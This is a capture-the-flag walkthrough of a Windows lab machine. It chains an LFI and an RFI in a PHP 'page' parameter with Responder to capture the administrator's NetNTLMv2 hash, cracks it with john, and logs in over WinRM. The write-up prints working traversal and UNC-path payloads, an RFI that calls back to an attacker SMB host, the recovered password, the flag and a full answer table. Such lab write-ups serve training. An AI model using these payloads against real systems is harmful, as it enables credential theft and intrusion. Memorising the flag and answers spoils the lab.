# Responder

|            |                                                                                              |
|------------|----------------------------------------------------------------------------------------------|
| Track      | Starting Point - Tier 1                                                                      |
| Difficulty | Very Easy                                                                                    |
| OS         | Windows                                                                                      |
| Tags       | Web, PHP, LFI, RFI, SMB, NetNTLMv2, Hash Cracking, WinRM                                     |
| Tools      | `nmap`, `curl`, `responder`, `john`, `evil-winrm`                                            |

## Summary

A Windows web host serving a multi-language PHP site that loads pages via a
`page` parameter without sanitising input. The parameter is vulnerable to both
LFI and RFI. We use the RFI to make the server fetch a file from an SMB
share we control, capture the inbound NetNTLMv2 challenge/response with
Responder, crack it offline to recover `administrator:badminton`, then log in
over WinRM (TCP/5985) and read the flag.

## Recon

```bash
nmap -sC -sV 10.129.109.28
```

Relevant findings:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

Hitting the IP directly returns links pointing at `http://unika.htb/...`, so
the box expects to be reached by hostname.

```bash
echo "10.129.109.28 unika.htb" | sudo tee -a /etc/hosts
```

## Enumeration

Browsing `http://unika.htb/` shows a generic Bootstrap site with a language
switcher in the top-right (English, French, German, Spanish). Clicking a flag
loads `index.php?page=french.html`. The `page` parameter is the obvious thing
to poke at.

### LFI confirm

```bash
curl -s -H "Host: unika.htb" \
  "http://10.129.109.28/index.php?page=../../../../../../../windows/system32/drivers/etc/hosts"
```

```
# Copyright (c) 1993-2009 Microsoft Corp.
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
...
```

LFI works. The `page` parameter is just dropped into a `file_get_contents`
style include.

### RFI

PHP on Windows can include UNC paths. Pointing `page` at an SMB share on our
attacker host should make the server reach back over SMB (and authenticate as
the running app pool identity).

## Foothold

### Path MTU gotcha (WSL + HTB VPN)

Before the WinRM step worked, every Create call was getting `Connection reset
by peer`. The cause was path MTU: `tun0` is set to 1500 but the real path
through the VPN to this box maxes out around 1200 bytes, so any TCP segment
larger than that gets dropped silently. A 1372-byte ping with DF set fails;
1200 succeeds. With no sudo to fix `tun0`, the workaround is to clamp TCP
MSS per-socket in Python before connecting:

```python
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_MAXSEG, 1100)
```

Worth remembering for any other Windows box on this VPN whose payloads spill
past one segment (WinRM, SMB, large LDAP responses).

### Capture the hash

Start Responder on the VPN interface:

```bash
sudo responder -I tun0
```

Trigger the RFI so the IIS process reaches out to our SMB share:

```bash
curl -s -H "Host: unika.htb" \
  "http://10.129.109.28/index.php?page=//10.10.14.28/share/x"
```

Responder logs the inbound NetNTLMv2 from the `administrator` account:

```
[SMB] NTLMv2-SSP Hash : administrator::RESPONDER:<challenge>:<response>
```

### Crack

Save the hash to a file and feed it to john with rockyou:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

```
badminton        (administrator)
```

## Get the flag

WinRM is open on 5985. Connect with the recovered creds:

```bash
evil-winrm -i 10.129.109.28 -u administrator -p badminton
```

The flag is on `mike`'s desktop:

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\mike\Desktop\flag.txt
ea81b7afddd03efaa0945333ed147fac
```

## Flag

```
ea81b7afddd03efaa0945333ed147fac
```

## Guided Tasks

| #  | Question | Answer |
|----|----------|--------|
| 1  | When visiting the web service using the IP address, what is the domain that we are being redirected to? | unika.htb |
| 2  | Which scripting language is being used on the server to generate webpages? | php |
| 3  | What is the name of the URL parameter which is used to load different language versions of the webpage? | page |
| 4  | Which value for `page` would be an LFI? | `../../../../../../../../windows/system32/drivers/etc/hosts` |
| 5  | Which value for `page` would be an RFI? | `//10.10.14.6/somefile` |
| 6  | What does NTLM stand for? | New Technology Lan Manager |
| 7  | Which flag do we use in the Responder utility to specify the network interface? | -I |
| 8  | Long form of `john`? | John The Ripper |
| 9  | What is the password for the administrator user? | badminton |
| 10 | We'll use a Windows service to remotely access the Responder machine. What TCP port does it listen on? | 5985 |
| Flag | Submit root flag | `ea81b7afddd03efaa0945333ed147fac` |
